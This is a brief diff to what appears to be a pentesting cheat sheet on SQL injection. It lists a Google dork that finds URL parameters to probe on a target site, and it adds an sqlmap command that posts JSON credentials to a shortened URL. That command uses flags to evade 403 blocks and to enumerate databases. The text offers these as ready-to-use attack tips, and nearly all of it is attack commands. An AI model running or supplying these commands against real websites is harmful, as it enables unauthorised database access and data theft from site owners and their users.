@@ -3,7 +3,11 @@ Google Dorks To Find Parameters To Test SQL Injection
 inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example[.]com
 
 _________________________________________________________
+how to pass JSON data in SQLMAP, here is what I used:
 
+sqlmap -u 'https://lnkd.in/d4TY3Cke' --data '{"User":"abcdefg","Pwd":"Abc@123"}' --random-agent --ignore-code=403 --dbs --hex
+
+--ignore-code=403 ==> Bypass HTTP 403 Forbidden
 _________________________________________________________
 
 _________________________________________________________
